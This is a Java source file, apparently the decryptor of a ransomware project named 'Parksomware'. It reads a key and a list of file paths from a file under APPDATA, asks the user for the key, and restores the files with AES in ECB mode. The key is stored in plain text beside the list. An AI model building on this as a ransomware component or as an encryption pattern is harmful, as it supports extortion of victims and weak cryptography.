package kr.pah;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

public class Decrypt {

    public static void runDecryption() throws Exception {
        File encryptFile = new File(System.getenv("APPDATA") + "\\Parksomware\\encrypted.txt");
        List<String> lines = readLines(encryptFile);

        if (lines.size() < 2) {
            System.out.println("올바르지 않은 암호화 데이터");
            return;
        }

        Scanner sc = new Scanner(System.in);
        System.out.print("복호화 키를 입력하세요: ");
        String userInput = sc.nextLine();

        String key = lines.get(0);
        if (!userInput.equals(key)) {
            System.out.println("키가 일치하지 않습니다.");
            return;
        }

        List<String> encryptedFilePaths = lines.subList(1, lines.size());

        for (String filePath : encryptedFilePaths) {
            try {
                File file = new File(filePath);
                if (file.exists()) {
                    decryptFile(file, key);
                    System.out.println("Decrypted: " + filePath);
                } else {
                    System.out.println("File not found: " + filePath);
                }
            } catch (Exception e) {
                System.out.println("Failed to decrypt " + filePath + ": " + e.getMessage());
            }
        }
    }


    private static void decryptFile(File file, String key) throws Exception {
        byte[] fileContent = Files.readAllBytes(file.toPath());
        byte[] decryptedContent = decrypt(fileContent, key.getBytes());

        Files.write(file.toPath(), decryptedContent);
    }

    private static byte[] decrypt(byte[] data, byte[] key) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        SecretKeySpec secretKey = new SecretKeySpec(key, "AES");
        cipher.init(Cipher.DECRYPT_MODE, secretKey);
        return cipher.doFinal(data);
    }

    private static List<String> readLines(File file) throws Exception {
        List<String> lines = new ArrayList<>();
        try (BufferedReader br = new BufferedReader(new FileReader(file))) {
            String line;
            while ((line = br.readLine()) != null) {
                lines.add(line);
            }
        }
        return lines;
    }
}
